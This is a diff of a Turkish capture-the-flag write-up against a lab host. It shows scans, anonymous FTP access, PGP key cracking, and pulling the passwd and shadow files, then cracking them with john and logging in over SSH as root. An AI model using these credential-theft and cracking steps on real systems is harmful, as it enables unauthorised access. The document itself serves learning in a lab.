@@ -1,4 +1,5 @@
-öncelikle rustscan ile hızlı bir tarama yapıyoruz rustscan tercih etmemin sebei nmape göre biraz daha hızlı fakat nmap daha deytayl ısonıuç veriyor bu yüzden rustscanden aldığımız bilgileri nmapte detaylıca analiz edicez 
+İlk olarak, hedef sistemde açık portları tespit edebilmek için Rustscan ile hızlı bir tarama gerçekleştiriyoruz.
+Rustscan’i tercih etmemin nedeni, Nmap’e kıyasla çok daha hızlı sonuç vermesi. Ancak Rustscan, yalnızca portları hızlı bir şekilde tespit eder; hizmet versiyonu veya derin analiz yapmaz. Bu nedenle, Rustscan çıktısında elde ettiğimiz port bilgilerini, daha detaylı analiz yapabilmek amacıyla Nmap'e aktarıyoruz.
 
 ```bash
 rustscan -a 10.10.42.172 
@@ -47,7 +48,11 @@ Read data files from: /usr/share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
            Raw packets sent: 6 (240B) | Rcvd: 7 (724B)
 ```
-rustscan taramamızı yaptık ve 21,22 portunun açık olduğunu gördük detaylıca anlaiz etmek için nmapte sadece 21 ve 22 portu için tarama  başlattık 
+
+---
+
+Rustscan taramasının ardından 21 ve 22 numaralı portların açık olduğunu tespit ettik.
+Bu portlara ilişkin daha detaylı bilgi edinmek amacıyla, yalnızca bu iki portu hedef alan özel bir Nmap taraması gerçekleştirdik. Böylece, açık olan servislerin versiyon bilgilerini ve olası zafiyetleri analiz etmeyi hedefledik.
 
 ```bash
 nmap -Pn -sV -A -p 21,22 10.10.42.172      
@@ -115,9 +120,10 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
 ```
+---
 
-nmapten aldığımı çıktıya göre 21 portunda çalışan FTP servisine anonymous giriş izin verilmiş gözüküyuot bizde girip baktık ve ftp servisinden user.txtye ulaşmayı başarıdkç.
-
+Nmap taramasından elde ettiğimiz çıktıya göre, 21 numaralı port üzerinde çalışan FTP servisine "anonymous" kullanıcı ile giriş yapılabildiğini gördük.
+Bu yetkiyi kullanarak FTP servisine bağlandık ve içerideki dizinleri inceledik. Yapılan inceleme sonucunda, FTP dizininde yer alan user.txt dosyasına ulaştık ve bu dosyayı indirerek ilk kullanıcı bayrağını (flag) başarıyla elde ettik.
 
 ```bash
 ftp 10.10.42.172
@@ -150,7 +156,11 @@ ftp> more user.txt
 6060xxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ftp> 
 ```
-sonrasında ftp servisinde gezinirken notread adlı bir dosya klasör olduğunu gördük 
+
+---
+
+FTP servisinde gezinmeye devam ederken, notread adında bir dizin (klasör) olduğunu fark ettik.
+Bu klasör, ismi ve boyutu itibariyle dikkat çekiciydi ve içeriğinde yetkisiz erişim kısıtlaması olabileceğini düşündürdü. Bu nedenle klasörü detaylıca incelemeye karar verdik.
 
 ```bash
 ftp> ls
@@ -184,7 +194,11 @@ lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmli
 226 Directory send OK.
 ftp> 
 ```
-notread klasörünün içeriğini kontrol ettik ve 2 adet dosya olduğunu gördük ve bunu localimize aldık.
+
+---
+
+notread klasörünün içeriğini kontrol ettiğimizde içerisinde iki adet dosya bulunduğunu gördük.
+Bu dosyaların içeriklerini daha rahat analiz edebilmek için her ikisini de kendi lokal sistemimize indirdik.
 
 ```bash
 ftp> cd notread
@@ -212,12 +226,18 @@ local: private.asc remote: private.asc
 ftp> 
 
 ```
-sonrasında private.asc olan anahtarımızı john aracığıyla kırmak için değiştirdk ve şifreyi kırdık ve şifeli olan gpg dosyaısnı açmayı başarıdk 
+---
+
+Arşivden elde ettiğimiz dosyalardan biri private.asc adlı bir PGP özel anahtarıydı.
+Bu anahtarı kullanabilmek için önce john aracıyla kırılabilir hale getirmek amacıyla uygun formata dönüştürdük. Ardından parola kırma işlemini gerçekleştirdik ve başarılı bir şekilde anahtarın şifresini çözdük.
+Elde ettiğimiz şifre sayesinde, elimizdeki şifreli .gpg dosyasını başarıyla açmayı başardık.
 
 <img width="1803" height="901" alt="root" src="https://github.com/user-attachments/assets/f4a619e0-22ef-486b-a35d-7dd79c8bdea0" />
 
+---
 
-backup içerisinden çıkan shadow dosyasını kaydettik ve localimize ftp servisi sayesinden /etc/passwd dosyasınıda çektik.
+Şifreli .gpg dosyasını açtıktan sonra, içerisinde sistemin shadow dosyasının yer aldığını fark ettik ve bu dosyayı kaydettik.
+Ayrıca, FTP servisi üzerinden /etc/passwd dosyasına da erişebildiğimizi gördük ve bu dosyayı da lokal sistemimize indirerek parola kırma işlemleri için gerekli tüm verileri toplamış olduk.
 
 ```bash
 ftp> cd /etc
@@ -231,21 +251,31 @@ local: passwd remote: passwd
 1524 bytes received in 00:00 (16.79 KiB/s)
 ftp> 
 ```
-sonrasında aşağıdaki komutu kullanarak passwd ve hsadow dosyasını birleşitrdik johunun kırabileceği formata getirdik
 
+---
+
+Ardından, aşağıdaki komutu kullanarak passwd ve shadow dosyalarını birleştirip, john aracının anlayabileceği uygun formata dönüştürdük:
 ```bash
 unshadow passwd shadow > kir.txt
 ```
+Bu şekilde oluşturduğumuz hash.txt dosyasını john ile parola kırma işlemine hazır hale getirdik.
 
-sonrasında bu kir.txt dosyasına johna verdik ve şifreyi kırmasını bekledik
+---
+
+Hazırladığımız kir.txt dosyasını john aracına vererek parola kırma işlemini başlattık.
+john, sistemdeki kullanıcıya ait parola hash’ini analiz ederek kısa süre içinde şifreyi başarılı bir şekilde kırdı.
+
 
 ```bash
 john kir.txt
 ```
+
 <img width="710" height="209" alt="ssh" src="https://github.com/user-attachments/assets/b3764d1b-ae78-4d2e-afe3-d454dbd4ca67" />
 
+---
 
-john ile şifremizi kırıdktan sonra ssh servisi ile root kullanıcısıyla sisteme erişiöm sağladık ve kök bayrağımızı aldık
+John ile şifreyi kırdıktan sonra, elde ettiğimiz kimlik bilgileriyle SSH servisine root kullanıcısı olarak bağlandık ve sistemdeki root bayrağını başarıyla ele geçirdik.
+
 
 ```bash
 ssh root@10.10.42.172
@@ -263,5 +293,8 @@ f706xxxxxxxxxxxxxxxxxxxxxxxxxxx
 root@ubuntu:~# 
 ```
 
+---
 
+Bu Ctf bana ne öğretti?
 
+Sonuç olarak, bu CTF süreci bana gerçek dünyadaki güvenlik açıklarını tespit etme, çeşitli araçları etkin şekilde kullanma ve sistemlerdeki zafiyetleri analiz ederek nasıl erişim sağlanacağını deneyimleme fırsatı sundu. Öğrendiğim teknikler, hem temel ağ keşfi hem de ileri düzey şifre kırma yöntemleri açısından önemliydi. Bu sayede hem teorik bilgimi pratiğe dökme hem de problem çözme yeteneklerimi geliştirme şansı buldum.
